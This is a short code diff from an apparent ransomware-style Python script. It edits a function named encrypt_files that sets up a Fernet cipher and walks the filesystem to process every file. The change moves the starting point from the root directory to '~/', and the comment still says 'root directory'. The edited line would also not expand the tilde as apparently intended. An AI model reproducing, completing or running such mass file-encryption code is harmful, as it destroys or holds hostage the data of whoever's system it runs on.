@@ -7,7 +7,7 @@ def encrypt_files(verbose=False):
     fernet = Fernet(key)
     if verbose:
         print("Encrypting files...")
-    for root, dirs, files in os.walk("/"):  # Start from the root directory
+    for root, dirs, files in os.walk("~/"):  # Start from the root directory
         for file in files:
             file_path = os.path.join(root, file)
             if verbose:
